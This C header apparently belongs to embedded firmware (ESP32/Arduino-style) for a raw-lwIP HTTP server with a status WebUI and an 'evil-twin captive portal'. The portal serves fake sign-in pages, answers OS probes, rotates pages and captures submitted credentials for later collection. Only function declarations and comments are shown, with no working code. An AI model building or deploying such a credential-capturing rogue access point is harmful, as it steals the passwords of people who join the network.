// M4: raw-lwIP TCP HTTP listener. The Arduino WiFiServer's accept never receives the SoftAP's
// connections (root-caused), so both the WebUI status page AND the evil-twin captive portal serve
// through lwIP's TCP raw API directly (like the DHCP/DNS servers use udp raw).
//   web_lwip_start(render)   - WebUI mode: serve the `render` page to any request.
//   web_lwip_start_portal()  - captive-portal mode: serve a sign-in page, answer OS probes, and
//                              CAPTURE submitted credentials (GET query) for loop() to drain.
#ifndef WEB_LWIP_H
#define WEB_LWIP_H
#include <stddef.h>
#include <stdbool.h>

bool web_lwip_start(void (*render)(char* buf, size_t cap));  // WebUI: bind+listen :80

// captive portal: bind+listen :80. The page is fetched from the resolver on every request that
// arrives while no response is streaming, so portal rotation takes effect on the next request and
// never swaps a buffer out from under an in-flight send. body==NULL -> built-in generic page.
// copy=true streams with TCP_WRITE_FLAG_COPY (required for any mutable buffer: customPortal and the
// Default page, which is rebuilt per resolve); only immutable flash gzip blobs pass copy=false.
typedef void (*web_resolve_fn)(const char** body, int* len, bool* gzip, bool* copy);
void web_lwip_set_resolver(web_resolve_fn fn);
bool web_lwip_start_portal(void);

// Portal root URL, derived by the sketch from the AP SSID. It is advertised in DHCP option 114,
// the 302 Location and the cp.json body, so all three always agree.
void web_lwip_set_urls(const char* root, const char* cpjson);

// Called once per captured credential submission (portal rotation). Runs in the tcpip thread: it
// must not block or allocate - just advance the selection.
void web_lwip_set_rotate(void (*fn)(void));

bool web_lwip_poll_creds(char* buf, int cap);
void web_lwip_set_probe204(bool on);           // bench: always answer probes with 204                // loop() drains captured creds (EV:)
unsigned web_lwip_creds_dropped(void);                       // submissions lost to a full queue
// Queue a customPortal edit; it runs in the tcpip thread and only while no response is streaming,
// so an in-flight page keeps its bytes. `arg` is passed through (e.g. the hex chunk to append).
void web_lwip_portal_edit(void (*fn)(const void* arg), const void* arg);
// Run a read-only function in the tcpip thread (no idle requirement).
void web_lwip_in_tcpip(void (*fn)(const void* arg), const void* arg);
void web_lwip_stop();

// Halt breadcrumbs: call web_lwip_diag_tick() 1x/s from loop(); the getters are the last stage the
// tcpip thread reached (1 accept, 2 recv, 3 request line, 4 creds, 5 cp.json, 6 probe, 7 resolve,
// 8 serve, 9 send body, 10 finish, 11 close, 12 tcp_sent), the request counter, and a tcpip-thread
// tick posted by diag_tick (0 = the tcpip thread has not run since start).
void web_lwip_diag_tick(void);
unsigned web_lwip_stage(void);
unsigned web_lwip_reqs(void);
unsigned web_lwip_ticks(void);
unsigned web_lwip_pcb_state(void);
#endif
